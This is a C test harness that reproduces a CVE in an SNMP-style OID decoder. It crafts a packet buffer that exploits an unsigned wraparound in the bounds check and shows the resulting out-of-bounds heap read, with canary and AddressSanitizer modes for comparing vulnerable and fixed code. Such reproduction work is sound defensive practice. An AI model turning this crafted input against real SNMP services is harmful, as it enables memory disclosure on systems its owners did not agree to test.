/* Direct-call harness for CVE-2026-59961 / GHSA-c9g2-5ghh-8g8c.
 * decode_str()/decode_oid() are re-extracted verbatim from pinned upstream
 * bytes into vuln/*.inc and fixed/*.inc by run.sh. No daemon, no listener,
 * no network: the packet buffer and adjacent heap are local test objects.
 */
#define _GNU_SOURCE 1
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>

#define MAX_NR_SUBIDS 20
#define LOG_DEBUG 7
#define logit(...) do { } while (0)

typedef struct oid_s {
    unsigned int subid_list[MAX_NR_SUBIDS];
    size_t subid_list_length;
    short encoded_length;
} oid_t;

#ifdef FIXED_VARIANT
#include "fixed/decode_oid.inc"
#include "fixed/decode_str.inc"
#else
#include "vuln/decode_oid.inc"
#include "vuln/decode_str.inc"
#endif

static void fill_packet(unsigned char *p, size_t cap, size_t size,
                        size_t pos, size_t len, unsigned char canary)
{
    size_t i;
    memset(p, 0x80, cap);              /* continuation bytes everywhere */
    for (i = 0; i < pos; i++) p[i] = 0x30;
    if (pos < cap) p[pos] = 0x2a;      /* OID start byte: high bit clear */
    for (i = pos + 1; i < size && i < cap; i++) p[i] = 0x80;
    if (size <= len) {
        for (i = size; i < size + 16 && i < cap; i++) p[i] = canary;
    }
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "arith";
    size_t size = argc > 2 ? (size_t)strtoul(argv[2], NULL, 10) : 2048;
    size_t len  = argc > 3 ? (size_t)strtoul(argv[3], NULL, 10) : 4000;
    size_t pos  = argc > 4 ? (size_t)strtoul(argv[4], NULL, 10) : 8;
    unsigned char canary = argc > 5
        ? (unsigned char)strtoul(argv[5], NULL, 16) : 0x5a;
    size_t wrapped = size - len + 1;   /* the vulnerable expression */
    oid_t oid;
    size_t p0 = pos;
    int rc;
    memset(&oid, 0, sizeof(oid));

    if (strcmp(mode, "arith") == 0) {
        printf("SIZE=%zu\nLEN=%zu\nPOS=%zu\n", size, len, pos);
        printf("SIZE_MINUS_LEN_PLUS_1=%zu\n", wrapped);
        printf("GUARD_BOUND_GT_SIZE=%d\n", wrapped > size ? 1 : 0);
        printf("GUARD_BYPASSED=%d\n", pos < wrapped ? 1 : 0);
        printf("READ_END_OFFSET=%zu\n", pos + len - 1);
        printf("OOB_BYTES=%zu\n", pos + len > size ? pos + len - size : 0);
        return 0;
    }
    if (strcmp(mode, "plain") == 0 || strcmp(mode, "safe") == 0) {
        /* 8192-byte workspace: first `size` bytes model the daemon's
         * client->packet[2048]; the rest are observable adjacent heap. */
        unsigned char *w = malloc(8192);
        if (!w) return 98;
        fill_packet(w, 8192, size, pos, len, canary);
        if (strcmp(mode, "safe") == 0) {
            for (size_t i = pos + 1; i < size; i++) w[i] = 0x02;
        }
        rc = decode_oid(w, size, &p0, len, &oid);
        printf("RC=%d\n", rc);
        printf("OID_SUBID_COUNT=%zu\n", oid.subid_list_length);
        printf("POS_AFTER=%zu\n", p0);
        for (size_t i = 0; i < oid.subid_list_length && i < 4; i++)
            printf("SUBID%zu_HEX=%08x\n", i, oid.subid_list[i]);
        printf("CANARY_BYTE=%02x\n", canary);
        printf("CANARY_LOW7=%02x\n", canary & 0x7f);
        if (strcmp(mode, "safe") == 0)
            printf("SAFE_MODE_LEN=%zu\n", len);
        free(w);
        return 0;
    }

    if (strcmp(mode, "asan") == 0) {
        /* Exact caller-sized allocation: ASan redzone starts at `size`. */
        unsigned char *p = calloc(1, size);
        if (!p) return 98;
        fill_packet(p, size, size, pos, len, canary);
        printf("CALL_SIZE=%zu\nCALL_LEN=%zu\nCALL_POS=%zu\n", size, len, pos);
        fflush(stdout);
        rc = decode_oid(p, size, &p0, len, &oid);
        printf("RC=%d\n", rc);
        free(p);
        return 0;
    }

    fprintf(stderr, "usage: %s arith|plain|safe|asan [size] [len] [pos] [canaryhex]\n",
            argv[0]);
    return 99;
}
